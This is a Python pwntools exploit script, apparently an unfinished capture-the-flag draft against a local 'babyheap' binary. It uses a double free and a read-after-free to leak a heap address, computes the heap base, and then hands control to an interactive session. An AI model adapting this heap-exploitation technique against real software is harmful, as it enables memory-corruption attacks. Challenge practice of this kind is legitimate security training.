from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./babyheap"

elf = ELF(binfile)

if len(argv) >= 2 and argv[1] == "d":
    p = gdb.debug(binfile, '''
        break *0x4009a0
        break *0x40091f
        continue
    ''')
else:
    p = process(binfile)

def write(size, data):
    log.info("[1] write")
    p.recvuntil(">")
    p.sendline("1")
    p.recvuntil("size :")
    p.sendline(str(size))
    p.recvuntil("data :")
    p.sendline(str(data))

def read(idx):
    log.info("[2] read")
    p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("index :")
    p.sendline(str(idx))

def free(idx):
    log.info("[3] free")
    p.recvuntil(">")
    p.sendline("3")
    p.recvuntil("index :")
    p.sendline(str(idx))

def exit():
    log.info("[4] exit")
    p.recvuntil(">")
    p.sendline("4")
    
write(0x18, "A"*8)
free(0)
free(0)
read(0)
heap_addr = u64(p.recv(4).ljust(8, b"\x00"))
log.info("heap_addr: 0x{:08x}".format(heap_addr))
heap_base = heap_addr - 0x2280
log.info("heap_base: 0x{:08x}".format(heap_base))
read(6299672)


p.interactive()
